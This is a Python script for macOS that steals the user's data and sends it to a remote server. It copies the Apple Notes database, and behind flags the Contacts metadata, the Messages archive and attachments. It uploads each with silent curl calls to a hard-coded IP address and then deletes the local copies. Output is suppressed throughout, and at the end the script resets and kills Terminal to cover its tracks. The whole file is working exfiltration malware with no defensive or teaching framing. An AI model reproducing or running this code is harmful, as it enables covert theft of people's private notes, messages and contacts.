#!/usr/bin/env python

import os
import shutil
import getpass
from os.path import expanduser
import subprocess
from time import sleep
import sys
sys.stdout = os.devnull

enableATCH = 1
debug = 0
notesOnly = 1

home = expanduser("~")

clocation = home + "/Library/Application Support/AddressBook/Metadata/"

uploadlink = "http://142.93.195.87:8080/"
# uploadlink = "http://localhost:8080/"

user = getpass.getuser()

shutil.copyfile(home + "/Library/Containers/com.apple.Notes/Data/Library/Notes/NotesV7.storedata", "./{0}-NotesV7.storedata".format(user))
with open(os.devnull, 'w') as fp:
    cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}-NotesV7.storedata'.format(user), uploadlink, "&"], stdout=fp)
sleep(5)
if debug is 0:
    os.unlink("./{0}NotesV7.storedata".format(user))

shutil.copyfile(home + "/Library/Containers/com.apple.Notes/Data/Library/Notes/NotesV7.storedata-wal", "./{0}-NotesV7.storedata-wal".format(user))
with open(os.devnull, 'w') as fp:
    cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}-NotesV7.storedata-wal'.format(user), uploadlink, "&"], stdout=fp)
sleep(5)
if debug is 0:
    os.unlink("./{0}NotesV7.storedata-wal".format(user))

if notesOnly is 1:
    sys.exit()

zipname = "./{0}-contacts".format(user)

shutil.make_archive(zipname, 'zip', clocation)

with open(os.devnull, 'w') as fp:
    cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
# This is not a good way to handle this but works for now
sleep(10)
if debug is 0:
    os.unlink(zipname + ".zip")

clocation = home + "/Library/Messages/Archive"


zipname = "./{0}-messages".format(user)


shutil.make_archive(zipname, 'zip', clocation)

with open(os.devnull, 'w') as fp:
    cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
sleep(20)
if debug is 0:
    os.unlink(zipname + ".zip")


if enableATCH is 1:
    clocation = home + "/Library/Messages/Attachments"

    zipname = "./{0}-attachments".format(user)

    shutil.make_archive(zipname, 'zip', clocation)

    with open(os.devnull, 'w') as fp:
        cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
    sleep(80)
    if debug is 0:
        os.unlink(zipname + ".zip")


subprocess.call(['tput', 'reset'])
subprocess.call(['killall', 'Terminal'])
